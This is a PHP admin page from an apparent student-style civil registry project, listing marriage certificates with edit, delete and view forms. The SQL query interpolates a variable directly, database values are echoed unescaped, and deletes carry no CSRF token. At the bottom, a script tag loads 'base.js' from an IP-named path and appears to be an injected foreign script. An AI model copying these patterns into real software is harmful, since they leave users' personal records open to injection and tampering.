<!DOCTYPE html>
<html lang="en">
<?php

//importing external files.

 include_once 'conndb.php';

?>
<!-- BEGIN HEAD -->



<head>
	
	<title>Civil Registry</title>
	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- data tables -->
	<link href="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>
<!-- END HEAD -->

<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-dark dark-sidebar-color logo-dark dark-theme">
	<div class="page-wrapper">
		<?php require 'nav.php'?>
		<div class="page-container">
			
			<!-- start page content -->
			<div class="page-content-wrapper">
				<div class="page-content">
					<div class="page-bar">
						<div class="page-title-breadcrumb">
							<div class=" pull-left">
								<div class="page-title">Marriage Certificates</div>
							</div>
							<ol class="breadcrumb page-breadcrumb pull-right">
								<li><i class="fa fa-home"></i>&nbsp;<a class="parent-item" href="index.php">Home</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li><a class="parent-item" href="#">Marriage</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li class="active">All marriage Certificates</li>
							</ol>
						</div>
					</div>
					<div class="row">
						<div class="col-md-12">
							<div class="tabbable-line">
								
								<div class="tab-content">
									<div class="tab-pane active fontawesome-demo" id="tab1">
										<div class="row">
											<div class="col-md-12">
												<div class="card card-box">
													<div class="card-head">
														<header>All Marriage Certificates</header>
														<div class="tools">
															<a class="fa fa-repeat btn-color box-refresh" href="javascript:;"></a>
															<a class="t-collapse btn-color fa fa-chevron-down" href="javascript:;"></a>
															<a class="t-close btn-color fa fa-times" href="javascript:;"></a>
														</div>
													</div>
													<div class="card-body ">
														<div class="row">
															<div class="col-md-6 col-sm-6 col-6">
																<div class="btn-group">
																	<a href="add_marriage.php" id="addRow" class="btn btn-info">
																		Add New <i class="fa fa-plus"></i>
																	</a>
																</div>
															</div>
															<script type="text/javascript">

																function printTab(tabId){
																	var printContents = document.getElementById(tabId).innerHTML;
																	var originalContents = document.body.innerHTML;

																	document.body.innerHTML = printContents;

																	window.print();

																	document.boby.innerHTML = originalContents;
																}
															</script>
															<div class="col-md-6 col-sm-6 col-6">
																<div class="btn-group pull-right">
																	<a class="btn deepPink-bgcolor  btn-outline dropdown-toggle" data-toggle="dropdown">Tools
																		<i class="fa fa-angle-down"></i>
																	</a>
																	<ul class="dropdown-menu pull-right">
																		<li>
																			<a href="javascript:;" onclick="printTab('tab')" >
																				<i class="fa fa-print"></i> Print </a>
																		</li>
																		<!--
																		<li>
																			<a href="javascript:;">
																				<i class="fa fa-file-pdf-o"></i> Save as PDF </a>
																		</li>
																		<li>
																			<a href="javascript:;">
																				<i class="fa fa-file-excel-o"></i> Export to Excel </a>
																		</li>
																	-->
																	</ul>
																</div>
															</div>
														</div>


														 <?php
$sub= $_SESSION['subdiv'];
  //Getting the certificate's information from the database.
  $sql = "SELECT * FROM Marriage_Certificate WHERE Reg_Cen = '$sub' ";

  $result = mysqli_query($conn, $sql) or die('could not access database'. mysqli_error($conn));
   ?>


														<div class="table-scrollable" id="tab">
															<table class="table table-striped table-bordered table-hover table-checkable order-column valign-middle"
															 id="example4">
																<thead>
																	<tr>
																		<th>No</th>
																		<th> Bridegroom </th>
																		<th> Bride</th>
																		<th> Publication </th>
																		<th> Type </th>
																		<th> Property</th>
																		<th>Center</th>
																		<th> Action </th>
																	</tr>
																</thead>
																<tbody>

																	<?php

																	 
    //setting variable to count the number of certificates.
    $count = 1;
  while($row = mysqli_fetch_assoc($result)){
      //Putting certificate information in the table.
?>

																	<tr class="odd gradeX">
																		<td><?php echo "$count"; ?>
																		</td>
																		<td class="left"><?php echo "{$row['BgName']}"; ?></td>
																		<td><?php echo "{$row['BrName']}"; ?></td>
																		<td class="left"><?php echo "{$row['Pub_id']}"; ?></td>
																		<td><?php echo "{$row['Mar_type']}"; ?></td>
																		<td><?php echo "{$row['Prop_type']}"; ?></td>
																		<td class="left"><?php echo "{$row['Reg_Cen']}"; ?></td>
																		<td>
																			<form method ="post" action="edit_marriage.php">
																				 <input type="hidden" name="mid" value="<?php echo "{$row['Mar_id']}"; ?>">
																				
															
																				<button class="button btn-primary btn-xs" type="submit" name ="edit"><i class="fa fa-pencil"></i></button>
																			</a>
																		</form>
																			

																			<form method ="post" action="delete.inc.php">
																				 <input type="hidden" name="mid" value="<?php echo "{$row['Mar_id']}"; ?>"> 
																			<button class="btn btn-danger btn-xs" type="submit" name="deletemc">
																				<i class="fa fa-trash-o "></i>
																			</button>
																			</form>

																				<form method="post" action="mc_view.php">
		                                                                     <input type="hidden" name="mid" value="<?php echo "{$row['Mar_id']}"; ?>">	
		                                                                   
          
																			<button class="btn btn-success btn-xs" type="submit" name="view">
																				<i class="fa fa-eye "></i>
																			</button>
																			</form>
																		</td>
																	</tr>
																	

  <?php
 $count = $count + 1;
  }
  ?>
																	
																	
																</tbody>
															</table>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									
		
		</div>
		<!-- end page container -->
		<?php require 'footer.php'?>
	</div>
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="../assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
	<!-- data tables -->
	<script src="../assets/plugins/datatables/jquery.dataTables.min.js"></script>
	<script src="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.js"></script>
	<script src="../assets/js/pages/table/table_data.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script></body>


<!-- Mirrored from radixtouch.in/templates/admin/smart/source/dark/all_students.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Nov 2018 19:23:22 GMT -->
</html>